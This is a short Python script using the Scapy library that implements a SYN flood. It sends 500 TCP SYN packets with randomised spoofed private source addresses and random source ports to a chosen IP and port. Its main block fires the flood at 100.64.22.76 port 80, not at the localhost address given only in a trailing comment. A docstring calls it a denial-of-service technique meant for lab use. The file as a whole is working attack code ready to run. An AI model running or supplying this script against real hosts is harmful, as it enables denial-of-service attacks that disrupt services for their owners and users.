from scapy.all import IP, TCP, send
import random

def syn_flood(target_ip, target_port):
    """
    Sends a burst of TCP SYN packets to the target IP and port, simulating a SYN flood attack.

    This function crafts raw TCP/IP packets with the SYN flag set to initiate connections 
    without completing the TCP handshake, potentially overwhelming the target system's 
    resources.

    Parameters:
    - target_ip (str): The destination IP address to flood.
    - target_port (int): The TCP port to target on the destination host.

    Warning:
    SYN flood attacks are considered denial-of-service (DoS) techniques and are illegal 
    to perform on unauthorized systems. Use this function strictly in isolated, controlled 
    lab environments for educational or testing purposes only.
    """
    for i in range(500):  # Send a large number of SYN packets
        # Randomize source IP (within a private range for realism in local tests)
        ip = IP(src=f"192.168.1.{random.randint(100, 200)}", dst=target_ip)
        
        # Randomize source port and set SYN flag
        tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
        
        # Combine IP and TCP layers into a single packet
        pkt = ip / tcp

        # Send the packet without displaying output
        send(pkt, verbose=0)

if __name__ == "__main__":
    # Example execution — replace with a safe test IP and port
    syn_flood("100.64.22.76", 80)

# Example usage (only in a legal, controlled lab environment):
# syn_flood("127.0.0.1", 80)
